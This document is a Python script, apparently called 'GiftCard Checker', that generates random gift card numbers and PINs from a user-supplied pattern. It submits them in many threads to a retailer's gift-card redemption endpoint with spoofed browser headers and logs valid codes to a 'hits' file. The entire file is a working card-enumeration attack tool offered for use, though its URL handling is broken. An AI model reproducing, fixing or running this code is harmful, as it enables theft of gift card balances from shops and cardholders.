import random
import threading
import requests
import ctypes
from time import sleep

working = True
goods = 0
bads = 0
retries = 0
errors = 0
signature = ""
codes = []

def start():
    global working, goods, bads, retries, errors, codes
    while working:
        input_data = signature.split(':')
        text = ""
        pin = ""
        
        for c in input_data[1]:
            if c == '!':
                pin += str(random.randint(0, 9))
            else:
                pin += c
                
        for c in input_data[0]:
            if c == '!':
                text += str(random.randint(0, 9))
            elif c == '@':
                text += chr(random.randint(97, 122))
            elif c == '&':
                text += chr(random.randint(65, 90))
            else:
                text += c
                
        if text not in codes:
            codes.append(text)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
                'Content-Type': 'application/html; charset=utf-8',
                'Accept': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            url = f"enter your own website but im going to show you example" + "www.imawesomeasf.com/-ApplyGiftCard?giftCertID={text}&giftCertPin={pin}&format=ajax"
            
            while True:
                try:
                    response = requests.get(url, headers=headers)
                    response_text = response.text
                    
                    if response_text is None:
                        retries += 1
                    elif "error" not in response_text:
                        break
                    elif "error" in response_text:
                        bads += 1
                        print(f"[BAD]: {text} Pin: {pin}")
                        break
                    elif "The gift card number entered is not valid in this currency." in response_text:
                        print(f"[Trash]: {text}")
                        break
                except:
                    retries += 1
                    
            if "error" not in response_text:
                goods += 1
                print(f"[HIT]: {text} Pin: {pin} Balance : ")
                with open("hits.txt", "a") as f:
                    f.write(f"{text} Pin: {pin} Balance : \n")

def update_title():
    global goods, bads, retries, errors
    while True:
        sleep(1)  # Change sleep time to 1 second instead of 100 ms
        title = f"GiftCard Checker | Made By dannyphantom | Goods: {goods} | Bads: {bads} | Retries: {retries} | Errors: {errors}"
        ctypes.windll.kernel32.SetConsoleTitleW(title)

def main():
    global working, signature
    print("Use ! to replace numbers")
    print("Use @ for lower case letters")
    print("Use & for Upper case letters")
    print("\nExample: 1@3&1!!!191")
    print("Enter a valid giftcard below")
    signature = input()
    
    print("\nUse ! to replace numbers")
    print("Use @ for lower case letters")
    print("Use & for Upper case letters")
    print("\nEnter Pin below")
    signature += ":" + input()
    
    print("\nHow many threads do you want?")
    num_threads = int(input())
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=start)
        t.start()
        threads.append(t)

    update_thread = threading.Thread(target=update_title)
    update_thread.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    update_thread.join()

if __name__ == "__main__":
    main()
